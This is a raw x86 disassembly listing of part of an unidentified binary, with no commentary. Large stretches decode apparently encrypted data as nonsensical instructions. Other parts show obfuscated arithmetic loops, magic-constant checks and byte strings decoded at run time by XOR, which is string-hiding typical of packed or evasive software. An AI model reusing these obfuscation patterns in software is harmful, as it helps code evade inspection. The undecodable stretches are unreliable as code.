  41c8be:	cmp    eax,DWORD PTR [eax+edi*8+0x57]
  41c8c2:	paddw  mm4,QWORD PTR [esi-0x28553f50]
  41c8c9:	sub    ecx,DWORD PTR [eax]
  41c8cb:	xor    BYTE PTR [edi-0x757be68a],ch
  41c8d1:	call   0xfebc:0x46359c03
  41c8d8:	test   eax,0xa1c1027
  41c8dd:	or     BYTE PTR [ebp-0x1a06a020],0xe8
  41c8e4:	repnz adc DWORD PTR [ecx],0xffffff9d
  41c8e8:	mov    esi,esp
  41c8ea:	sub    esp,DWORD PTR ss:[esi+esi*4+0x187a6c11]
  41c8f2:	push   0x7f1ce99f
  41c8f7:	cmp    edx,esi
  41c8f9:	aad    0xb8
  41c8fb:	(bad)  
  41c8fc:	inc    ebx
  41c8fd:	xchg   ecx,eax
  41c8fe:	or     DWORD PTR [ebx],ebx
  41c900:	dec    esi
  41c901:	mov    DWORD PTR [ebx],edi
  41c903:	ja     0x41c89b
  41c905:	adc    DWORD PTR [esi-0xb],edx
  41c908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c909:	push   eax
  41c90a:	(bad)  
  41c90b:	(bad)  
  41c90c:	mov    ds:0xf1ebe399,al
  41c911:	push   edx
  41c912:	sub    al,0x58
  41c914:	xor    ah,BYTE PTR [eax+0x54]
  41c917:	jo     0x41c8b3
  41c919:	mov    ah,BYTE PTR [eax+ebp*4]
  41c91c:	cwde   
  41c91d:	outs   dx,DWORD PTR ds:[esi]
  41c91e:	xchg   esp,eax
  41c91f:	add    DWORD PTR [edx+eiz*4+0x19],esp
  41c923:	sbb    DWORD PTR [edx-0x7e],ebx
  41c926:	test   eax,0x241b50f9
  41c92b:	push   esi
  41c92c:	jl     0x41c8fd
  41c92e:	adc    al,bh
  41c930:	jne    0x41c932
  41c932:	add    DWORD PTR [eax+edi*2],ecx
  41c935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c936:	and    bl,ah
  41c938:	adc    al,0x71
  41c93a:	dec    eax
  41c93b:	xor    al,BYTE PTR [edi-0x2f381fc1]
  41c941:	xchg   ebx,eax
  41c942:	ret    0x821f
  41c945:	adc    BYTE PTR [esi+edx*4],0x49
  41c949:	cmp    DWORD PTR [ecx+0x5351b23a],ebp
  41c94f:	mov    ecx,0x751465bc
  41c954:	inc    ecx
  41c955:	jns    0x41c962
  41c957:	mul    DWORD PTR [esi+0xc]
  41c95a:	sub    al,0x21
  41c95c:	cli    
  41c95d:	repnz xlat BYTE PTR ds:[ebx]
  41c95f:	shr    DWORD PTR [ecx-0x52],cl
  41c962:	cdq    
  41c963:	mov    esi,DWORD PTR [edi-0x2]
  41c966:	fcom   DWORD PTR [esi+0x649eb8e4]
  41c96c:	dec    edi
  41c96d:	bound  esp,QWORD PTR [ebp+0x1f]
  41c970:	jle    0x41c8fe
  41c972:	xchg   ebx,eax
  41c973:	pop    ss
  41c974:	mov    esi,0x94d47470
  41c979:	xchg   esp,esp
  41c97b:	cli    
  41c97c:	and    al,0xb4
  41c97e:	mov    cl,0x66
  41c980:	mov    edi,esp
  41c982:	fdiv   QWORD PTR [ecx-0x649f04f6]
  41c988:	inc    edi
  41c989:	mov    bh,0x34
  41c98b:	jmp    0x541a543f
  41c990:	stc    
  41c991:	jne    0x41c913
  41c993:	push   eax
  41c994:	setb   dh
  41c997:	sub    dh,al
  41c999:	sbb    DWORD PTR [esi-0x65ada1ca],0xf8b51893
  41c9a3:	mov    cl,BYTE PTR [ebx]
  41c9a5:	aaa    
  41c9a6:	ins    DWORD PTR es:[edi],dx
  41c9a7:	mov    dl,0x2c
  41c9a9:	adc    BYTE PTR [ebx+ebp*4-0x44b0e868],ah
  41c9b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9b1:	(bad)  
  41c9b2:	cli    
  41c9b3:	inc    ebx
  41c9b4:	push   0xa7528f8f
  41c9b9:	int    0xda
  41c9bb:	cmp    eax,0xf07697e0
  41c9c0:	mov    ecx,0x8758bad4
  41c9c5:	add    ebp,DWORD PTR [esi]
  41c9c7:	shr    al,1
  41c9c9:	call   0x90698cb5
  41c9ce:	fmul   st,st(2)
  41c9d0:	imul   edx,DWORD PTR [ebx],0xc9d8bf15
  41c9d6:	mov    al,0xff
  41c9d8:	aaa    
  41c9d9:	pcmpeqb mm6,QWORD PTR [eax+eax*1-0x2f6e44f7]
  41c9e1:	jnp    0x41c9f7
  41c9e3:	iret   
  41c9e4:	imul   DWORD PTR [esi+0x49]
  41c9e7:	mov    ebx,0xce3ec96e
  41c9ec:	(bad)  
  41c9ed:	push   ebp
  41c9ee:	fcmove st,st(0)
  41c9f0:	pop    ebx
  41c9f1:	js     0x41ca1e
  41c9f3:	push   edx
  41c9f4:	inc    edx
  41c9f5:	push   cs
  41c9f6:	addr16 aaa 
  41c9f8:	popa   
  41c9f9:	ins    DWORD PTR es:[edi],dx
  41c9fa:	push   ebp
  41c9fb:	xchg   esi,eax
  41c9fc:	loope  0x41ca41
  41c9fe:	adc    eax,0x5c0895f6
  41ca03:	adc    BYTE PTR [edi+0x49683613],al
  41ca09:	test   DWORD PTR [edi+0x5b],edx
  41ca0c:	nop
  41ca0d:	xor    ch,BYTE PTR [ecx+0x7]
  41ca10:	and    eax,0xb19fda6e
  41ca15:	and    DWORD PTR [ebx+0x2f],eax
  41ca18:	les    eax,FWORD PTR [ebx-0x65]
  41ca1b:	jno    0x41ca6d
  41ca1d:	int3   
  41ca1e:	pop    ds
  41ca1f:	shl    BYTE PTR ds:0x6500ff4e,cl
  41ca25:	mov    edx,0x8c2f379
  41ca2a:	call   0x1925ace3
  41ca2f:	jmp    0xaf78ca95
  41ca34:	cmp    BYTE PTR [edx+ebx*8],0x4e
  41ca38:	arpl   bp,sp
  41ca3a:	pop    ds
  41ca3b:	jle    0x41c9f3
  41ca3d:	mov    ds:0x23ceb9c,eax
  41ca42:	pop    ebp
  41ca43:	pushf  
  41ca44:	in     al,0x42
  41ca46:	retf   
  41ca47:	push   esi
  41ca48:	mov    eax,0xe8272f00
  41ca4d:	jnp    0x41ca7e
  41ca4f:	call   0x13ad:0xe34b3d96
  41ca56:	xor    esp,DWORD PTR [ecx-0x1ddb8a82]
  41ca5c:	vpcomub xmm6,xmm7,XMMWORD PTR [ebp-0xfcee2fc],0x9c
  41ca66:	and    dh,dl
  41ca68:	je     0x41ca36
  41ca6a:	retf   
  41ca6b:	dec    esp
  41ca6c:	xchg   esi,eax
  41ca6d:	dec    edi
  41ca6e:	sbb    BYTE PTR fs:[ecx+eax*4-0x21c7e627],dl
  41ca76:	lahf   
  41ca77:	adc    dh,BYTE PTR [ebx+0x1a164c6e]
  41ca7d:	jg     0x41ca58
  41ca7f:	xchg   BYTE PTR [eax-0x12],dh
  41ca82:	mov    BYTE PTR [esi+0x84df5cc],dl
  41ca88:	test   DWORD PTR [ecx-0x44],esi
  41ca8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca8c:	mov    eax,0x610e9270
  41ca91:	int3   
  41ca92:	xchg   ebx,eax
  41ca93:	retf   0xd0a3
  41ca96:	fldenv [ebp-0x51]
  41ca99:	and    eax,0xe663f85e
  41ca9e:	aad    0x31
  41caa0:	daa    
  41caa1:	repz lds edx,FWORD PTR [esp+eax*4+0x6e]
  41caa6:	int3   
  41caa7:	xchg   esi,eax
  41caa8:	inc    edx
  41caa9:	lods   eax,DWORD PTR ds:[esi]
  41caab:	pop    esp
  41caac:	push   es
  41caad:	jle    0x41cafe
  41caaf:	test   eax,0x50df1229
  41cab4:	cdq    
  41cab5:	(bad)  
  41cab6:	xor    ebp,edi
  41cab8:	call   0x2a4b:0xe72c320b
  41cabf:	sub    eax,0x551bce9e
  41cac4:	xchg   edi,eax
  41cac5:	sti    
  41cac6:	push   ss
  41cac7:	daa    
  41cac8:	sar    BYTE PTR [edi+0x4246e20c],1
  41cace:	cs mov dl,0x9f
  41cad1:	int    0xaa
  41cad3:	add    al,0x2c
  41cad5:	iret   
  41cad6:	sub    dh,ch
  41cad8:	sbb    DWORD PTR [ecx-0x49775f52],esp
  41cade:	add    BYTE PTR [edi+0x41],bl
  41cae1:	inc    edi
  41cae2:	dec    ebx
  41cae3:	pop    esp
  41cae4:	xor    eax,0xb8aed14b
  41cae9:	mov    esi,DWORD PTR [ecx-0xde20d21]
  41caef:	daa    
  41caf0:	mov    esp,ebp
  41caf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caf3:	int3   
  41caf4:	mov    ch,dh
  41caf6:	add    BYTE PTR [edi-0x7834b5e5],cl
  41cafc:	cmc    
  41cafd:	push   edi
  41cafe:	ins    BYTE PTR es:[edi],dx
  41caff:	and    DWORD PTR [edx-0x45],esi
  41cb02:	in     al,dx
  41cb03:	sub    al,dl
  41cb05:	out    0xd0,eax
  41cb07:	out    dx,al
  41cb08:	sbb    eax,0xd3413348
  41cb0d:	pop    esi
  41cb0e:	stos   DWORD PTR es:[edi],eax
  41cb0f:	xchg   ebx,eax
  41cb10:	jbe    0x41caf1
  41cb12:	lea    edx,[ebx]
  41cb14:	mov    bl,0x0
  41cb16:	xor    ebx,DWORD PTR [eax+ecx*1-0x60bde742]
  41cb1d:	ja     0x41cb11
  41cb1f:	cmc    
  41cb20:	fwait
  41cb21:	mov    al,ds:0x26d001da
  41cb26:	mov    WORD PTR [esi+0x5d822e77],gs
  41cb2c:	stc    
  41cb2d:	call   0x3305:0x597aefb5
  41cb34:	and    al,0x7d
  41cb36:	cmp    ecx,DWORD PTR [edx-0x16]
  41cb39:	mov    edi,0xb3936466
  41cb3e:	fst    DWORD PTR [ecx]
  41cb40:	js     0x41cb9c
  41cb42:	pop    ss
  41cb43:	mov    eax,0x8b013272
  41cb48:	xchg   DWORD PTR [ecx+0x76f62ec7],ebp
  41cb4e:	retf   0xe79e
  41cb51:	in     al,0xe1
  41cb53:	sub    BYTE PTR [edx+0x5],0xee
  41cb57:	and    ebp,edi
  41cb59:	cs inc edx
  41cb5b:	push   cs
  41cb5c:	clc    
  41cb5d:	popf   
  41cb5e:	sbb    dh,BYTE PTR [ecx]
  41cb60:	cmp    BYTE PTR [esi+0x5589d323],bh
  41cb66:	mov    ah,0x8b
  41cb68:	push   ebp
  41cb69:	or     BYTE PTR [ebx-0x6b7247a3],cl
  41cb6f:	adc    ebx,DWORD PTR [edi]
  41cb71:	cld    
  41cb72:	inc    ecx
  41cb73:	add    cl,BYTE PTR [ecx+0x558bb855]
  41cb79:	or     BYTE PTR [ebx-0x5a1ea1e],bh
  41cb7f:	sub    ebx,edx
  41cb81:	add    ebx,DWORD PTR [ebp-0x44]
  41cb84:	mov    DWORD PTR [ebp-0x44],ebx
  41cb87:	mov    edx,DWORD PTR [ebp+0x8]
  41cb8a:	xor    edx,eax
  41cb8c:	add    edx,esi
  41cb8e:	jne    0x41a7ce
  41cb94:	mov    edx,DWORD PTR [ebp-0x14]
  41cb97:	mov    DWORD PTR [ebp+0x8],edx
  41cb9a:	jmp    0x41cc0f
  41cb9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cba2:	mov    ebx,DWORD PTR [ebp-0x8]
  41cba5:	xor    edx,eax
  41cba7:	xor    ebx,eax
  41cba9:	sub    edx,ebx
  41cbab:	sub    edx,esi
  41cbad:	xor    edx,eax
  41cbaf:	mov    DWORD PTR [ebp+0x8],edx
  41cbb2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbb5:	mov    ebx,DWORD PTR [ebp-0x58]
  41cbb8:	add    edx,0x5708c4
  41cbbe:	imul   edx,ebx
  41cbc1:	mov    DWORD PTR [ebp-0x58],edx
  41cbc4:	mov    edx,DWORD PTR [ebp+0x8]
  41cbc7:	mov    ebx,DWORD PTR [ebp-0x54]
  41cbca:	add    edx,0x64f8da
  41cbd0:	or     edx,ebx
  41cbd2:	mov    DWORD PTR [ebp-0x54],edx
  41cbd5:	mov    edx,DWORD PTR [ebp+0x8]
  41cbd8:	mov    ebx,DWORD PTR [ebp-0x50]
  41cbdb:	add    edx,ecx
  41cbdd:	xor    edx,ebx
  41cbdf:	mov    DWORD PTR [ebp-0x50],edx
  41cbe2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbe5:	mov    ebx,DWORD PTR [ebp-0x4c]
  41cbe8:	add    edx,edi
  41cbea:	and    edx,ebx
  41cbec:	mov    DWORD PTR [ebp-0x4c],edx
  41cbef:	mov    edx,DWORD PTR [ebp+0x8]
  41cbf2:	mov    ebx,DWORD PTR [ebp-0x48]
  41cbf5:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cbfc:	mov    DWORD PTR [ebp-0x48],edx
  41cbff:	mov    edx,DWORD PTR [ebp+0x8]
  41cc02:	mov    ebx,0xfa5e15e2
  41cc07:	sub    ebx,edx
  41cc09:	add    ebx,DWORD PTR [ebp-0x44]
  41cc0c:	mov    DWORD PTR [ebp-0x44],ebx
  41cc0f:	mov    edx,DWORD PTR [ebp+0x8]
  41cc12:	xor    edx,eax
  41cc14:	add    edx,esi
  41cc16:	jne    0x41cb9f
  41cc1c:	mov    edx,DWORD PTR [ebp-0x8]
  41cc1f:	mov    ebx,DWORD PTR [ebp-0xc]
  41cc22:	xor    edx,eax
  41cc24:	lea    edx,[edx+ebx*1+0x3272e2]
  41cc2b:	mov    DWORD PTR [ebp-0xc],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	xor    edx,eax
  41cc33:	add    edx,esi
  41cc35:	jne    0x413baf
  41cc3b:	jmp    0x41cd52
  41cc40:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc43:	mov    DWORD PTR [ebp+0x8],ecx
  41cc46:	jmp    0x41ccbf
  41cc4b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc4e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc51:	xor    ecx,eax
  41cc53:	xor    edx,eax
  41cc55:	sub    ecx,edx
  41cc57:	sub    ecx,esi
  41cc59:	xor    ecx,eax
  41cc5b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc5e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc61:	mov    edx,DWORD PTR [ebp-0x58]
  41cc64:	add    ecx,0x5708c4
  41cc6a:	imul   ecx,edx
  41cc6d:	mov    DWORD PTR [ebp-0x58],ecx
  41cc70:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc73:	mov    edx,DWORD PTR [ebp-0x54]
  41cc76:	add    ecx,0x64f8da
  41cc7c:	or     ecx,edx
  41cc7e:	mov    DWORD PTR [ebp-0x54],ecx
  41cc81:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc84:	mov    edx,DWORD PTR [ebp-0x50]
  41cc87:	add    ecx,0x242ebe9
  41cc8d:	xor    ecx,edx
  41cc8f:	mov    DWORD PTR [ebp-0x50],ecx
  41cc92:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc95:	mov    edx,DWORD PTR [ebp-0x4c]
  41cc98:	add    ecx,edi
  41cc9a:	and    ecx,edx
  41cc9c:	mov    DWORD PTR [ebp-0x4c],ecx
  41cc9f:	mov    ecx,DWORD PTR [ebp+0x8]
  41cca2:	mov    edx,DWORD PTR [ebp-0x48]
  41cca5:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ccac:	mov    DWORD PTR [ebp-0x48],ecx
  41ccaf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccb2:	mov    edx,0xfa5e15e2
  41ccb7:	sub    edx,ecx
  41ccb9:	add    edx,DWORD PTR [ebp-0x44]
  41ccbc:	mov    DWORD PTR [ebp-0x44],edx
  41ccbf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccc2:	xor    ecx,eax
  41ccc4:	add    ecx,esi
  41ccc6:	jne    0x41cc4b
  41cccc:	jmp    0x41cd5e
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	mov    edx,DWORD PTR [ebp-0x8]
  41ccd7:	xor    ecx,eax
  41ccd9:	xor    edx,eax
  41ccdb:	sub    ecx,edx
  41ccdd:	sub    ecx,esi
  41ccdf:	xor    ecx,eax
  41cce1:	mov    DWORD PTR [ebp+0x8],ecx
  41cce4:	mov    ecx,DWORD PTR [ebp+0x8]
  41cce7:	mov    edx,DWORD PTR [ebp-0x58]
  41ccea:	add    ecx,0x5708c4
  41ccf0:	imul   ecx,edx
  41ccf3:	mov    DWORD PTR [ebp-0x58],ecx
  41ccf6:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccf9:	mov    edx,DWORD PTR [ebp-0x54]
  41ccfc:	add    ecx,0x64f8da
  41cd02:	or     ecx,edx
  41cd04:	mov    DWORD PTR [ebp-0x54],ecx
  41cd07:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd0a:	mov    edx,DWORD PTR [ebp-0x50]
  41cd0d:	add    ecx,0x242ebe9
  41cd13:	xor    ecx,edx
  41cd15:	mov    DWORD PTR [ebp-0x50],ecx
  41cd18:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd1b:	mov    edx,DWORD PTR [ebp-0x4c]
  41cd1e:	add    ecx,edi
  41cd20:	and    ecx,edx
  41cd22:	mov    DWORD PTR [ebp-0x4c],ecx
  41cd25:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd28:	mov    edx,DWORD PTR [ebp-0x48]
  41cd2b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41cd32:	mov    DWORD PTR [ebp-0x48],ecx
  41cd35:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd38:	mov    edx,0xfa5e15e2
  41cd3d:	sub    edx,ecx
  41cd3f:	add    edx,DWORD PTR [ebp-0x44]
  41cd42:	mov    DWORD PTR [ebp-0x44],edx
  41cd45:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd48:	xor    ecx,eax
  41cd4a:	add    ecx,esi
  41cd4c:	jne    0x41ccd1
  41cd52:	mov    ecx,DWORD PTR [ebp-0x8]
  41cd55:	xor    ecx,eax
  41cd57:	mov    eax,DWORD PTR [ebp+0x10]
  41cd5a:	add    ecx,esi
  41cd5c:	mov    DWORD PTR [eax],ecx
  41cd5e:	pop    edi
  41cd5f:	pop    esi
  41cd60:	pop    ebx
  41cd61:	leave  
  41cd62:	ret    0xc
  41cd65:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41cd6b:	inc    edx
  41cd6c:	add    BYTE PTR [eax],cl
  41cd6e:	mov    al,ds:0xa00c0042
  41cd73:	inc    edx
  41cd74:	add    BYTE PTR [eax],dl
  41cd76:	mov    al,ds:0xa0140042
  41cd7b:	inc    edx
  41cd7c:	add    BYTE PTR [eax],bl
  41cd7e:	mov    al,ds:0xa01c0042
  41cd83:	inc    edx
  41cd84:	add    BYTE PTR [eax],al
  41cd86:	rol    BYTE PTR [edx+0x0],1
  41cd89:	add    al,0xd0
  41cd8b:	inc    edx
  41cd8c:	add    BYTE PTR [eax],cl
  41cd8e:	rol    BYTE PTR [edx+0x0],1
  41cd91:	or     al,0xd0
  41cd93:	inc    edx
  41cd94:	add    BYTE PTR [eax],dl
  41cd96:	rol    BYTE PTR [edx+0x0],1
  41cd99:	adc    al,0xd0
  41cd9b:	inc    edx
  41cd9c:	add    BYTE PTR [eax],bl
  41cd9e:	rol    BYTE PTR [edx+0x0],1
  41cda1:	sbb    al,0xd0
  41cda3:	inc    edx
	...
  41cdb4:	rcr    esp,1
  41cdb6:	xor    BYTE PTR [ebp+0x0],cl
  41cdb9:	add    BYTE PTR [eax],al
  41cdbb:	add    BYTE PTR [edx],al
  41cdbd:	add    BYTE PTR [eax],al
  41cdbf:	add    BYTE PTR ds:0x40000000,bh
  41cdc5:	into   
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	inc    eax
  41cdc9:	ret    0x1
  41cdcc:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41cdd2:	inc    edx
  41cdd3:	add    BYTE PTR [eax],cl
  41cdd5:	nop
  41cdd6:	inc    edx
  41cdd7:	add    BYTE PTR [eax+edx*4],cl
  41cdda:	inc    edx
  41cddb:	add    BYTE PTR [eax],dl
  41cddd:	nop
  41cdde:	inc    edx
  41cddf:	add    BYTE PTR [eax+edx*4],dl
  41cde2:	inc    edx
  41cde3:	add    BYTE PTR [eax],bl
  41cde5:	nop
  41cde6:	inc    edx
  41cde7:	add    BYTE PTR [eax+edx*4],bl
  41cdea:	inc    edx
  41cdeb:	add    BYTE PTR [eax],ah
  41cded:	nop
  41cdee:	inc    edx
  41cdef:	add    BYTE PTR [eax+edx*4],ah
  41cdf2:	inc    edx
  41cdf3:	add    BYTE PTR [eax],ch
  41cdf5:	nop
  41cdf6:	inc    edx
  41cdf7:	add    BYTE PTR [eax],al
  41cdf9:	mov    al,0x42
  41cdfb:	add    BYTE PTR [eax+esi*4],al
  41cdfe:	inc    edx
  41cdff:	add    BYTE PTR [eax],cl
  41ce01:	mov    al,0x42
  41ce03:	add    BYTE PTR [eax+esi*4],cl
  41ce06:	inc    edx
  41ce07:	add    BYTE PTR [eax],dl
  41ce09:	mov    al,0x42
  41ce0b:	add    BYTE PTR [eax+esi*4],dl
  41ce0e:	inc    edx
  41ce0f:	add    BYTE PTR [eax],bl
  41ce11:	mov    al,0x42
  41ce13:	add    BYTE PTR [eax+esi*4],bl
  41ce16:	inc    edx
  41ce17:	add    BYTE PTR [eax],al
  41ce19:	rol    BYTE PTR [edx+0x0],0x4
  41ce1d:	rol    BYTE PTR [edx+0x0],0x8
  41ce21:	rol    BYTE PTR [edx+0x0],0xc
  41ce25:	rol    BYTE PTR [edx+0x0],0x10
  41ce29:	rol    BYTE PTR [edx+0x0],0x14
  41ce2d:	rol    BYTE PTR [edx+0x0],0x18
  41ce31:	rol    BYTE PTR [edx+0x0],0x1c
  41ce35:	rol    BYTE PTR [edx+0x0],0x0
  41ce39:	add    BYTE PTR [eax],al
  41ce3b:	add    BYTE PTR [eax],al
  41ce3d:	add    BYTE PTR [eax],al
  41ce3f:	add    BYTE PTR [edx+0x53],dl
  41ce42:	inc    esp
  41ce43:	push   ebx
  41ce44:	and    esp,esi
  41ce46:	sub    ebx,esp
  41ce48:	mov    dh,0xd8
  41ce4a:	ins    DWORD PTR es:[edi],dx
  41ce4b:	dec    ecx
  41ce4c:	mov    ds:0x3befddb2,al
  41ce51:	xchg   ecx,eax
  41ce52:	std    
  41ce53:	or     DWORD PTR [ecx],eax
  41ce55:	add    BYTE PTR [eax],al
  41ce57:	add    BYTE PTR [ebx+0x3a],al
  41ce5a:	pop    esp
  41ce5b:	inc    ebx
  41ce5c:	jne    0x41ced0
  41ce5e:	jb     0x41cec5
  41ce60:	outs   dx,BYTE PTR ds:[esi]
  41ce61:	je     0x41cea7
  41ce63:	popa   
  41ce64:	je     0x41cec7
  41ce66:	pop    esp
  41ce67:	dec    ebp
  41ce68:	outs   dx,DWORD PTR ds:[esi]
  41ce69:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ce71:	ins    BYTE PTR es:[edi],dx
  41ce72:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ce79:	dec    esi
  41ce7a:	gs ja  0x41ce7d
  41ce7d:	mov    edx,DWORD PTR [ebp-0x14]
  41ce80:	sub    esp,0xe4
  41ce86:	push   ebx
  41ce87:	push   edi
  41ce88:	mov    eax,ebx
  41ce8a:	xchg   ecx,eax
  41ce8b:	mov    eax,DWORD PTR [ebp+0x8]
  41ce8e:	mov    edi,0xf89c8585
  41ce93:	cmp    eax,edi
  41ce95:	jne    0x41d21d
  41ce9b:	mov    eax,DWORD PTR [ebp+0xc]
  41ce9e:	cmp    eax,0xf89c8584
  41cea3:	jne    0x41d21d
  41cea9:	mov    eax,DWORD PTR [ebp+0x24]
  41ceac:	mov    DWORD PTR [ebp-0x4],eax
  41ceaf:	mov    BYTE PTR [ebp-0x18],0x1b
  41ceb3:	mov    BYTE PTR [ebp-0x17],0x18
  41ceb7:	mov    BYTE PTR [ebp-0x16],0x5
  41cebb:	mov    BYTE PTR [ebp-0x15],0x4f
  41cebf:	mov    BYTE PTR [ebp-0x14],0x4e
  41cec3:	mov    BYTE PTR [ebp-0x13],0x7c
  41cec7:	mov    BYTE PTR [ebp-0x20],0x9
  41cecb:	mov    BYTE PTR [ebp-0x1f],0xf
  41cecf:	mov    BYTE PTR [ebp-0x1e],0x19
  41ced3:	mov    BYTE PTR [ebp-0x1d],0xe
  41ced7:	mov    BYTE PTR [ebp-0x1c],0x4f
  41cedb:	mov    BYTE PTR [ebp-0x1b],0x4e
  41cedf:	mov    BYTE PTR [ebp-0x1a],0x7c
  41cee3:	mov    BYTE PTR [ebp-0x28],0xf
  41cee7:	mov    BYTE PTR [ebp-0x27],0x4
  41ceeb:	mov    BYTE PTR [ebp-0x26],0x0
  41ceef:	mov    BYTE PTR [ebp-0x25],0xb
  41cef3:	push   esi
  41cef4:	mov    BYTE PTR [ebp-0x24],0x1d
  41cef8:	mov    BYTE PTR [ebp-0x23],0xc
  41cefc:	push   0x74
  41cefe:	mov    BYTE PTR [ebp-0x22],0x5
  41cf02:	mov    BYTE PTR [ebp-0x21],0x7c
  41cf06:	xor    esi,esi
  41cf08:	pop    edx
  41cf09:	mov    eax,0xf8
  41cf0e:	lea    ecx,[ebp+esi*1-0x18]
  41cf12:	movzx  ebx,BYTE PTR [ecx]
  41cf15:	xor    ebx,edx
  41cf17:	add    ebx,eax
  41cf19:	inc    esi
  41cf1a:	mov    BYTE PTR [ecx],bl
  41cf1c:	cmp    esi,0x6
  41cf1f:	jb     0x41cf0e
  41cf21:	xor    esi,esi
  41cf23:	lea    ecx,[ebp+esi*1-0x20]
  41cf27:	movzx  ebx,BYTE PTR [ecx]
  41cf2a:	xor    ebx,edx
  41cf2c:	add    ebx,eax
  41cf2e:	inc    esi
  41cf2f:	mov    BYTE PTR [ecx],bl
  41cf31:	cmp    esi,0x7
  41cf34:	jb     0x41cf23
  41cf36:	xor    esi,esi
  41cf38:	lea    ecx,[ebp+esi*1-0x28]
  41cf3c:	movzx  ebx,BYTE PTR [ecx]
  41cf3f:	xor    ebx,edx
  41cf41:	add    ebx,eax
  41cf43:	inc    esi
  41cf44:	mov    BYTE PTR [ecx],bl
  41cf46:	cmp    esi,0x8
  41cf49:	jb     0x41cf38
  41cf4b:	lea    eax,[ebp-0x2c]
  41cf4e:	mov    DWORD PTR [ebp-0x8],eax
  41cf51:	mov    ecx,DWORD PTR [ebp-0x8]
  41cf54:	mov    eax,0x7113fcef
  41cf59:	mov    DWORD PTR [ecx],eax
  41cf5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  41cf5e:	cmp    ecx,eax
  41cf60:	jne    0x41cf6c
  41cf62:	mov    DWORD PTR [ebp-0x8],edi
  41cf65:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41cf6c:	mov    eax,DWORD PTR [ebp-0x4]
  41cf6f:	mov    ecx,DWORD PTR [eax+0x18c]
  41cf75:	xor    eax,eax
  41cf77:	mov    ebx,0x3272e2
  41cf7c:	cmp    DWORD PTR [ecx],eax
  41cf7e:	jne    0x41d1b6
  41cf84:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf87:	mov    ecx,DWORD PTR [ecx+0x17c]
  41cf8d:	mov    DWORD PTR [ecx],eax
  41cf8f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf92:	mov    ecx,DWORD PTR [ecx+0x180]
  41cf98:	mov    DWORD PTR [ecx],eax
  41cf9a:	mov    esi,0x4e22
  41cf9f:	mov    eax,0x4f8f
  41cfa4:	mov    WORD PTR [ebp-0x78],ax
  41cfa8:	mov    eax,esi
  41cfaa:	mov    WORD PTR [ebp-0x76],ax
  41cfae:	add    eax,0x5d
  41cfb1:	mov    WORD PTR [ebp-0x74],ax
  41cfb5:	lea    eax,[esi+0x1d]
  41cfb8:	mov    WORD PTR [ebp-0x72],ax
  41cfbc:	mov    eax,0x4f92
  41cfc1:	mov    WORD PTR [ebp-0x70],ax
  41cfc5:	lea    eax,[esi+0x1c]
  41cfc8:	mov    WORD PTR [ebp-0x6e],ax
  41cfcc:	add    eax,0x3f
  41cfcf:	mov    WORD PTR [ebp-0x6c],ax
  41cfd3:	lea    eax,[esi+0x16]
  41cfd6:	mov    WORD PTR [ebp-0x6a],ax
  41cfda:	mov    eax,esi
  41cfdc:	mov    WORD PTR [ebp-0x68],ax
  41cfe0:	add    eax,0x19
  41cfe3:	mov    WORD PTR [ebp-0x66],ax
  41cfe7:	mov    eax,0x99ff
  41cfec:	mov    WORD PTR [ebp-0x64],ax
  41cff0:	mov    eax,0x828e
  41cff5:	mov    WORD PTR [ebp-0x62],ax
  41cff9:	mov    eax,0xd78d
  41cffe:	mov    WORD PTR [ebp-0x60],ax
  41d002:	add    eax,0x1c
  41d005:	mov    WORD PTR [ebp-0x5e],ax
  41d009:	mov    eax,0x27a8
  41d00e:	mov    WORD PTR [ebp-0x5c],ax
  41d012:	mov    eax,0x47a8
  41d017:	mov    WORD PTR [ebp-0x5a],ax
  41d01b:	lea    eax,[esi+0x17]
  41d01e:	push   0x8
  41d020:	mov    WORD PTR [ebp-0x58],ax
  41d024:	mov    DWORD PTR [ebp-0x10],0xb00040f
  41d02b:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  41d032:	lea    eax,[ebp-0x10]
  41d035:	pop    edi
  41d036:	mov    cl,BYTE PTR [eax]
  41d038:	xor    cl,dl
  41d03a:	sub    cl,0x8
  41d03d:	mov    BYTE PTR [eax],cl
  41d03f:	inc    eax
  41d040:	dec    edi
  41d041:	jne    0x41d036
  41d043:	lea    eax,[ebp-0x10]
  41d046:	mov    DWORD PTR [ebp-0xb8],eax
  41d04c:	lea    eax,[ebp-0xbc]
  41d052:	push   eax
